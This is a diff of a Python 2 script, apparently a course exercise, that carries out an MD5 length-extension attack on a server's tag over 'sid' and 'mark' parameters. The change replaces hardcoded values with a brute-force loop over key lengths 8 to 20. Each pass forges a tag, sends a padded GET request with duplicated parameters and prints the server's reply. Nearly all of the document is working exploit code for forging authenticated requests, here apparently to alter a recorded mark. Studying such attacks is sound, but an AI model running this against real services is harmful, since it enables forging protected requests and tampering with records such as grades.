@@ -5,8 +5,6 @@ from md5p import md5, padding
 ### attack ####
 ###############
 
-KEY = 11
-
 def attack(url, tag, sid, mark): 
     # parameter url is the attack url you construct
     parsedURL = urlparse.urlparse(url)
@@ -16,27 +14,29 @@ def attack(url, tag, sid, mark):
     httpconn = httplib.HTTPConnection(parsedURL.hostname, parsedURL.port)
 
     h = md5(state=tag.decode("hex"),count=512)
-    h.update("&sid=1001537483&mark=100")
+    h.update("&sid=" + str(sid) + "&mark=" + str(mark))
     illegalTag = h.hexdigest()
 
-    query = parsedURL.path + \
-            "?tag=" + illegalTag + \
-            "&sid=" + sid + \
-            urllib.quote(padding(8 * (15 + KEY))) + \
-            "&sid=" + sid + \
-            "&mark=" + str(mark)
-    #print(query)
-    # issue server-API request
-    httpconn.request("GET", query)
+    for KEY in range(8, 21):
 
-    # httpresp is response object containing a status value and possible message
-    httpresp = httpconn.getresponse()
+	    query = parsedURL.path + \
+		    "?tag=" + illegalTag + \
+		    "&sid=" + sid + \
+		    urllib.quote(padding(8 * (15 + KEY))) + \
+		    "&sid=" + sid + \
+		    "&mark=" + str(mark)
 
-    # valid request will result in httpresp.status value 200
-    print httpresp.status
+	    # issue server-API request
+	    httpconn.request("GET", query)
 
-    # in the case of a valid request, print the server's message
-    print httpresp.read()
+	    # httpresp is response object containing a status value and possible message
+	    httpresp = httpconn.getresponse()
+
+	    # valid request will result in httpresp.status value 200
+	    print httpresp.status
+
+	    # in the case of a valid request, print the server's message
+	    print httpresp.read()
     
     # return the url that made the attack successul 
     return(query) # dummy code
